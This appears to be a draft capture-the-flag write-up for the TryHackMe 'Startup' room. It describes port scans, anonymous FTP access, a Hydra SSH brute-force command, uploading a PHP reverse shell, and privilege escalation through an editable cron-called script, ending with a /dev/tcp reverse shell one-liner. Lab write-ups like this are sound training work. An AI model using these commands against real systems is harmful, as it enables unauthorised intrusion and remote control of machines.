## Startup

### Difficulty
Easy

### Skills gained

### Link
https://tryhackme.com/room/startup

### Writeup

• As usual, the first thing I ran was a basic nmap scan which revealed 3 ports open

    nmap -T4 -p- TARGETIP

<1--- INSERT NMAP SCAN 1 --->

• I then ran a more in-depth nmap scan to discover more about these open ports

    nmap -T4 -A -p21,22,80 TARGETIP

<!--- INSERT NMAP SCAN 2 --->

• I also ran a dirb scan to see if we could find any hidden directories
    dirb http://TARGETIP wordlist.txt

<!--- INSERT DIRB SCAN --->

• This scan found a files directory

• The initial landing page stated that the site was in development. No extra information could be gained from looking at the source code

<!--- INSERT IMAGE OF LANDING PAGE --->

• There us a 'contact us' button on this page, which looks like it is meant to contain an email address however it does not

• The files page showed a few files, which indicated a possible vulnerability

• As the earlier scans indicated that there was an FTP server which was vulnerable to anonymous login, I decided to try this route. 
    
    ftp TARGETIP
    
• I used the username 'anonymous' and the password 'ftp@' which successfully logged me in.

• There were 2 files on the FTP server, which I was able to download. These files were the same as the ones shown on the files page as well as having a hidden file on .test.log

<!--- INSERT IMAGE OF THE FILES AVAILABLE --->

• notice.txt was a note to stop leaving amongus files on the server. It didn't give a lot of information away, but it did let us know that someone called Maya works at the company. The other two files did not show anything

• As the nmap scan also showed that ssh was available on the target, I decided to use Hydra to try and brute force using the username maya

    hydra -l maya -P wordlist.txt ssh://TARGETIP

• Whilst Hydra was running I decided to try and upload a reverse shell on the ftp server

• Logging into the ftp server, I couldn't upload a file to the initial directory, however I could to once I changed to the ftp directory, so I uploaded the reverse shell by pentestmonkey

• I set up a listener, then went to the files page and clicked on the reverse shell, which gave me a shell and the first ingredient!

<!--- IMAGE OF SHELL ON PAGE --->

• I then had to try and escalate my privileges, to do this I looked around the files until I found one called 'suspicious.pcapng'

• I copied this file to the ftp server, then downloaded it onto my machine

    cp suspicious.pcapng > /var/www/html/files/ftp

• I analysed it through wireshark, which allowed me to find out that someone else had used a reverse shell to get into the target machine


<!--- INSERT WIRESHARK IMAGE --->

• I exported the data as plaintext, then searched for the word 'password' which gave me Lennie's password

<!--- INSERT PLAINTEXT IMAGE --->

• I used SSH to get into Lennie's account, and was able to get the flag from 'user.txt'

• My last step was to find a way to gain root access. To do this I had a look around the scripts folder in Lennie's directory

• The scripts folder had a script called planner.sh, which Lennie did not have privileges to edit, however looking at the code it referred to /etc/print.sh

<!--- INSERT IMAGE OF PLANNER.SH --->

• I had a look at print.sh, which Lennie could edit, and changed it to a reverse shell which I got from revshells.com

    exec 5<>/dev/tcp/TARGETIP/PORT;cat <&5 | while read line; do $line 2>&5 >&5; done

• This gave me root access, and allowed me to get the last flag from root.txt
    


